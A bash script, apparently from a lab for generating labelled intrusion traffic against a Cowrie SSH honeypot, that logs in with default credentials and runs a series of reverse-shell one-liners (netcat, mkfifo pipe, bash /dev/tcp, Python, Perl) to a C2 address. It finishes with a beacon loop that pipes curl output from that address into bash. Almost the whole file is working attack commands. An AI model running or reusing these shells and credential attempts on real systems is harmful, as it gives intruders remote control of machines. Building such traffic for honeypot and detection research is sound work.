#!/bin/bash
# 시나리오 06: 리버스 셸 / C2 통신
# Label: Intrusion
# 도구: SSH + netcat, python3
# 설명: Cowrie에 SSH 로그인 후 리버스 셸 명령어 실행
# (Cowrie는 명령어를 기록하고 has_reverse_shell 피처를 생성함)

LABEL="Intrusion"
SCENARIO="reverse_shell"
echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p 2222"
C2_IP="172.30.0.20"
C2_PORT="4444"

# netcat 리버스 셸 시도 (root)
echo "[*] Netcat reverse shell attempt"
sshpass -p "password" ssh $SSH_OPTS root@172.30.0.10 << ENDSSH 2>/dev/null || true
nc ${C2_IP} ${C2_PORT} -e /bin/bash
nc -e /bin/sh ${C2_IP} ${C2_PORT}
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${C2_IP} ${C2_PORT} > /tmp/f
ENDSSH

# bash /dev/tcp 리버스 셸 시도 (admin)
echo "[*] Bash /dev/tcp reverse shell attempt"
sshpass -p "admin" ssh $SSH_OPTS admin@172.30.0.10 << ENDSSH 2>/dev/null || true
bash -i >& /dev/tcp/${C2_IP}/${C2_PORT} 0>&1
exec 5<>/dev/tcp/${C2_IP}/${C2_PORT}; cat <&5 | while read line; do \$line 2>&5 >&5; done
ENDSSH

# Python3 리버스 셸 시도 (pi)
echo "[*] Python3 reverse shell attempt"
sshpass -p "raspberry" ssh $SSH_OPTS pi@172.30.0.10 << ENDSSH 2>/dev/null || true
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${C2_IP}",${C2_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("${C2_IP}",${C2_PORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
ENDSSH

# Perl 리버스 셸 시도 (test)
echo "[*] Perl reverse shell attempt"
sshpass -p "test" ssh $SSH_OPTS test@172.30.0.10 << ENDSSH 2>/dev/null || true
perl -e 'use Socket;\$i="${C2_IP}";\$p=${C2_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ENDSSH

# C2 비콘 시뮬레이션 (wget/curl을 통한 C2 통신)
echo "[*] C2 beacon simulation"
sshpass -p "user" ssh $SSH_OPTS user@172.30.0.10 << ENDSSH 2>/dev/null || true
while true; do
  curl -s http://${C2_IP}:8080/cmd | bash
  wget -qO- http://${C2_IP}:8080/beacon > /dev/null
  sleep 60
done &
ENDSSH

echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
